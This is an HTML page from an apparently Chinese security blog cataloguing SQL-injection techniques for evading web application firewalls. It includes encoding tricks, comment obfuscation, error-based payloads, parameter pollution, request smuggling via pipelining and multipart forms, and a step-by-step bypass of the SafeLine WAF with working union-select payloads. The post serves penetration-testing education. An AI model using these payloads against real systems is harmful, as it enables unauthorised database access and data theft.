@@ -1,0 +1,1275 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SQL注入WAF绕过, InBlog">
+    <meta name="description" content="函数常真绕过验证SQL语句是否插入成功，可以替换常用的函数
+1&amp;#39;like &amp;#39;1
+1&amp;#39;like &amp;#39;2
+
+
+其他的方式
+1&amp;#39;&amp;#x3D;1&amp;#x3D;&amp;#39;1
+1&amp;#39;&amp;#x3D;1&amp;#x3D;&amp;">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SQL注入WAF绕过 | InBlog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+    <style>
+        body{
+            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+            background-repeat:no-repeat;
+            background-size: 100% 100%;
+            background-attachment:fixed;
+        }
+    </style>
+
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">InBlog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">InBlog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQL注入WAF绕过</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/C/">
+                                <span class="chip bg-color">C++</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="post-category">
+                                二进制
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-10-31
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="函数常真绕过"><a href="#函数常真绕过" class="headerlink" title="函数常真绕过"></a>函数常真绕过</h1><p>验证SQL语句是否插入成功，可以替换常用的函数</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;like &#39;1
+1&#39;like &#39;2</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101135951885.png" alt="image-20251101135951885"></p>
+<p>其他的方式</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;&#x3D;1&#x3D;&#39;1
+1&#39;&#x3D;1&#x3D;&#39;2
+1&#39;||exp(709)||&#39; #exp(709)是临界值，超过这个值就会报错
+1&#39;||exp(710)||&#39;</code></pre>
+
+<p>所以可以根据这个函数来进行其他的盲注。</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;||exp(710-(CURRENT_USER like &#39;r%&#39;))||&#39;</code></pre>
+
+<p>可以扩展出其他的可注入函数</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;||cot(0)||&#39;  #公式为 cot(x) &#x3D; 1 &#x2F; tan(x) tan(0)&#x3D;0报错	
+1&#39;||cot(1)||&#39;
+
+1&#39;||power(2,999)||&#39;   #计算 2 的 999 次方
+1&#39;||power(2,9999)||&#39;
+
+-1&#39;||ISNULL(null)||&#39;  #ISNULL(expr)，如果expr的值为null，则返回1，如果expr1的值不为null，则返回0
+-1&#39;||ISNULL(1)||&#39;</code></pre>
+
+<p>许多函数都能测试注入。</p>
+<p>或者利用数据库的特性，例如在Mysql中，<code>@@version</code>是系统存在的变量。使用语句</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;and@@version%23   
+1&#39;and@@aaaa%23   #因为@@version是系统存在的变量，返回为true。@@aaaa是随便输入的返回False就会报错Unknown system variable &#39;aaaa&#39;</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101144042492.png" alt="image-20251101144042492"></p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101144007463.png" alt="image-20251101144007463"></p>
+<h1 id="order-by-绕过"><a href="#order-by-绕过" class="headerlink" title="order by 绕过"></a>order by 绕过</h1><p>可使用<code>group by</code>和<code>into</code>替代</p>
+<h1 id="函数报错"><a href="#函数报错" class="headerlink" title="函数报错"></a>函数报错</h1><p>例如GEOMETRYCOLLECTION函数</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">=</span><span class="token keyword">GEOMETRYCOLLECTION</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+  //报错回显1</span></code></pre>
+
+<p>可以用报错注入</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">=</span><span class="token keyword">GEOMETRYCOLLECTION</span><span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ </span></code></pre>
+
+<p>很多报错函数</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">POINT</span>
+<span class="token keyword">MULTIPOINT</span>
+<span class="token keyword">LINESTRING</span>
+<span class="token keyword">MULTILINESTRING</span>
+<span class="token keyword">POLYGON</span>
+<span class="token keyword">MULTIPOLYGON</span>
+<span class="token keyword">GEOMETRYCOLLECTION</span>
+ST_GeomFromText
+ST_GeomFromWKB
+ST_PointFromText
+ST_LineStringFromText
+ST_PolygonFromText
+ST_MultiPointFromText
+ST_MultiLineStringFromText
+ST_MultiPolygonFromText
+ST_GeomCollFromText
+ST_AsText
+ST_AsBinary
+ST_Area
+ST_Length
+ST_Distance
+ST_Within
+ST_Contains
+ST_Intersects
+ST_Touches
+ST_Crosses
+ST_Equals
+ST_Disjoint
+ST_X
+ST_Y
+ST_NumPoints
+ST_NumGeometries
+ST_GeometryType
+ST_Envelope
+ST_StartPoint
+ST_EndPoint
+ST_IsClosed
+ST_IsEmpty
+ST_Centroid
+ST_Boundary
+ST_Buffer
+ST_Union
+ST_Difference
+ST_Intersection
+ST_SymDifference</code></pre>
+
+<p>还有一类是会把参数拼进错误信息的函数。就像updatexml函数会直接把里面的函数执行结果返回到报错信息里面</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT updatexml(user(), user(),user())</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251227204415902.png" alt="image-20251227204415902"></p>
+<p>这类函数有</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">GTID_SUBSET(gtid_set, gtid_set)
+WAIT_FOR_EXECUTED_GTID_SET(gtid_set, timeout)
+GTID_SUBTRACT(gtid_set1, gtid_set2)
+EXTRACTVALUE(xml, xpath)
+UPDATEXML(xml, xpath, new_value)	</code></pre>
+
+<h1 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h1><p><strong>URL编码</strong></p>
+<p>URL编码在 iis 里会自动把 url 编码转换成字符串传到程序中执行。例如 union select 可以转换成 u%6eion s%65lect</p>
+<p><strong>Unicode编码</strong></p>
+<p>\u”或者是“%u”加上 4 位 16 进制 Unicode 码值。</p>
+<p>iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码</p>
+<p>-1 union select 1,user()</p>
+<p>部分转码</p>
+<pre class="language-none"><code class="language-none">-1 uni%u006fn sel%u0065ct 1,user()</code></pre>
+
+<p>全部转码</p>
+<pre class="language-none"><code class="language-none">%u002d%u0031%u0020%u0075%u006e%u0069%u006f%u006e%u0020%u0073%u0065%u006c%u0065%u0063%u0074%u0020%u0031%u002c%u0075%u0073%u0065%u0072%u0028%u0029</code></pre>
+
+<h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p>对关键词进行大小写</p>
+<h1 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h1><p>有些waf会对关键词进行过滤，若只过滤1次，则可以双写绕过。</p>
+<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><p>%20&#x3D;%a0&#x3D;%09&#x3D;%0a&#x3D;0b&#x3D;%0c&#x3D;%0d&#x3D;+&#x3D;<code>/**/</code>&#x3D;<code>/*!/**/*/</code></p>
+<h1 id="等于符号绕过"><a href="#等于符号绕过" class="headerlink" title="等于符号绕过"></a>等于符号绕过</h1><p>使用&lt;&#x3D;&gt;或者like代替&#x3D;</p>
+<h1 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h1><p>传参<code>?id=1&amp;id=2</code>时，会将两个参数的内容拼接在一起，例如此处就会拼接成12。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Web环境</th>
+<th align="left">参数获取函数</th>
+<th align="left">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">PHP&#x2F;Apache</td>
+<td align="left">$_GET(“par”)</td>
+<td align="left">last</td>
+</tr>
+<tr>
+<td align="left">JSP&#x2F;Tomcat</td>
+<td align="left">Request.getParameter(“par”)</td>
+<td align="left">first</td>
+</tr>
+<tr>
+<td align="left">Perl(CGI)&#x2F;Apache</td>
+<td align="left">Param(“par”)</td>
+<td align="left">first</td>
+</tr>
+<tr>
+<td align="left">Python&#x2F;Apache</td>
+<td align="left">getvalue(“par”)</td>
+<td align="left">[“first”,”last”]</td>
+</tr>
+<tr>
+<td align="left">ASP.NET&#x2F;IIS</td>
+<td align="left">Request.QueryString(“par”)</td>
+<td align="left">first,last</td>
+</tr>
+</tbody></table>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251010210509442.png" alt="image-20251010210509442"></p>
+<h1 id="脏数据溢出"><a href="#脏数据溢出" class="headerlink" title="脏数据溢出"></a>脏数据溢出</h1><p>数据太多超过waf检测范围，然后造成绕过,前面填垃圾数据后面填要注入的SQL语句，如果是GET传参，参数值超过GET所能运行的长度可能无法利用，所以最好是POST传参(前提是对方支持POST传参)</p>
+<h1 id="union和select"><a href="#union和select" class="headerlink" title="union和select"></a>union和select</h1><p>union和select中间可以加其他参数进行混淆</p>
+<p>union和select中间可以添加</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">ALL
+DISTINCT
+DISTINCTROW</code></pre>
+
+<p>select后面加</p>
+<pre class="language-none"><code class="language-none">HIGH_PRIORITY
+STRAIGHT_JOIN
+SQL_SMALL_RESULT
+SQL_BIG_RESULT
+SQL_BUFFER_RESULT
+SQL_CACHE
+SQL_NO_CACHE
+SQL_CALC_FOUND_ROWS</code></pre>
+
+<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p><strong>内联注释</strong></p>
+<p>在!后面添加版本号，则仅当MySQL版本大于或者等于指定的版本号时，才会执行注释中的语法</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;and 1&#x3D;2 &#x2F;*!%55NiOn*&#x2F; &#x2F;*!%53eLEct*&#x2F; 1,2,3%23</code></pre>
+
+<p><code>/*! */</code>类型的注释，内部语句会被执行</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;and 1&#x3D;2 &#x2F;*!%55NiOn*&#x2F; &#x2F;*!%53eLEct*&#x2F; 1,2,3%23</code></pre>
+
+<p><strong>注释符混淆</strong></p>
+<pre class="language-none"><code class="language-none">&#x2F;*!--+&#x2F;*
+&#x2F;*&#x2F;*&#x2F;union&#x2F;*&#x2F;*&#x2F;</code></pre>
+
+<p>可以在<code>/**/</code>中间爆破<code>/*!+</code>等特殊字符</p>
+<h1 id="参数位置调整"><a href="#参数位置调整" class="headerlink" title="参数位置调整"></a>参数位置调整</h1><p>多数WAF重点检测GET和POST传参的攻击特征，对 Cookie 参数的检测较宽松。后端若可以从 Cookie 中获取参数则会执行注入。</p>
+<h1 id="pipline"><a href="#pipline" class="headerlink" title="pipline"></a>pipline</h1><p>http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止</p>
+<p><strong>操作</strong></p>
+<p>用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改 成 <code>keep-alive</code> 把 brupsuite 自动更新 Content-Length 勾去掉。</p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101150439794.png" alt="image-20251101150439794"></p>
+<p><img src="D:\桌面\note\Image\image-20250927090351448.png" alt="image-20250927090351448"></p>
+<p><img src="/./imagesimage-20250927090351448.png" alt="image-20250927090351448"></p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20250927091545382.png" alt="image-20250927091545382"></p>
+<p>有些 waf 会匹配第二个包的正属于正常参数，不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截</p>
+<h1 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h1><p>使用Burp的chunked-coding-converter插件进行绕过</p>
+<h1 id="伪造-XFF"><a href="#伪造-XFF" class="headerlink" title="伪造 XFF"></a>伪造 XFF</h1><p>WAF 可能信任<code>X-Forwarded-For</code>中的 IP（如 127.0.0.1），对来自该 IP 的请求放松检测。</p>
+<pre class="language-none"><code class="language-none">X-Forwarded-For: 127.0.0.1</code></pre>
+
+<h1 id="方法切换"><a href="#方法切换" class="headerlink" title="方法切换"></a>方法切换</h1><p>如果WAF为 post 请求和 get 请求设定了不同的匹配规则，那么切换请求方法可能可以进行绕过</p>
+<h1 id="文件白名单"><a href="#文件白名单" class="headerlink" title="文件白名单"></a>文件白名单</h1><p>有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作</p>
+<p>index.php&#x2F;1.png?id&#x3D;1</p>
+<h1 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h1><p>例如benchmark()代替sleep()</p>
+<h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><p>将POST传参改为文件上传的格式进行绕过。</p>
+<p><strong>00截断</strong></p>
+<p>改为文件上传表单后在filename之后用00截断。这样PHP也会认为是POST传参，而WAF可能继续读到filename以为是文件上传就放行</p>
+<p>安全狗可直接绕过</p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251011191425821.png" alt="image-20251011191425821"></p>
+<p><strong>双写</strong></p>
+<pre class="language-none"><code class="language-none">------WebKitFormBoundaryzHzT58xrcR0K10xk
+Content-Disposition: form-data; name&#x3D;&quot;id&quot;;
+Content-Type: image&#x2F;jpeg
+
+1and+1&#x3D;1
+------WebKitFormBoundaryzHzT58xrcR0K10xk
+Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;file_name.jpg&quot;
+Content-Type: image&#x2F;jpeg
+
+1
+------WebKitFormBoundaryzHzT58xrcR0K10xk--</code></pre>
+
+<ol start="4">
+<li><strong>skip_upload</strong></li>
+</ol>
+<p>当文件上传数量超出最大值后，会跳过当前 part 文件的处理。在 php 5.2.12 和以上的版本，有一个隐藏的文件上传限制是在 <code>php.ini</code> 里没有的，就是这个 <code>max_file_uploads</code> 的设定，该默认值是 20, 在 php 5.2.17 的版本中该值已不再隐藏。文 件上传限制最大默认设为 20，所以一次上传最大就是 20 个文档，所以超出 20 个就会报错。</p>
+<p>如果拼接了这 20 个 part，就填满了 Maximum，导致最后一个 upload 无法生效，就只能从 FILES 转化为 POST 了</p>
+<pre class="language-none"><code class="language-none">.....20个part
+------WebKitFormBoundaryGUiHAAO5FDl5AzXy
+Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;file_name.jpg&quot;
+Content-Type: image&#x2F;jpeg
+
+1
+------WebKitFormBoundaryGUiHAAO5FDl5AzXy
+Content-Disposition: form-data; name&#x3D;&quot;id&quot;;
+Content-Type: image&#x2F;jpeg
+
+1&#39;and+1&#x3D;1--+
+------WebKitFormBoundaryzHzT58xrcR0K10xk--</code></pre>
+
+<h1 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h1><p>左边是注释的内容</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;union select 1,&#123;xx 2&#125;,&#123;zhushi 3&#125;--+</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101151931375.png" alt="image-20251101151931375"></p>
+<h1 id="雷池WAF绕过"><a href="#雷池WAF绕过" class="headerlink" title="雷池WAF绕过"></a>雷池WAF绕过</h1><p>一个单引号报错，两个正常，判断存在SQL注入。</p>
+<p>‘and+’1’&#x3D;’1 毫不意外被WAF拦截</p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101135504127.png" alt="image-20251101135504127"></p>
+<p>使用payload</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;||cot(0)||&#39;  #回显错误
+1&#39;||cot(1)||&#39;  #页面正常</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101183620156.png" alt="image-20251101183620156"></p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101183708708.png" alt="image-20251101183708708"></p>
+<p>使用into判断列数</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;into @a,@b,@c%23</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101200444226.png" alt="image-20251101200444226"></p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101200501600.png" alt="image-20251101200501600"></p>
+<p>使用大数据包进行注入</p>
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101201909201.png" alt="image-20251101201909201"></p>
+<p>使用注释符混淆进行联合注入</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;*!&#x2F;**&#x2F;*&#x2F;</code></pre>
+
+<p>在<code>union select</code>之间插入<code>/**/</code>，爆破中间，测试出可绕过的注释符<code>/*!/**/*/</code></p>
+<pre class="language-none"><code class="language-none">1&#39;and 1&#x3D;2 union&#x2F;*!&#x2F;**&#x2F;*&#x2F;select 1,database(),user()%23</code></pre>
+
+<p><img src="/images/posts/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/image-20251101202216948.png" alt="image-20251101202216948"></p>
+<p>后续直接注入雷池WAF也不会再进行拦截。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doramer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://doramer.github.io/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/">https://doramer.github.io/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doramer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/C/">
+                                    <span class="chip bg-color">C++</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="C语言学习">
+                        
+                        <span class="card-title">C语言学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-10-31
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="post-category">
+                                    二进制
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/C%E8%AF%AD%E8%A8%80/">
+                        <span class="chip bg-color">C语言</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
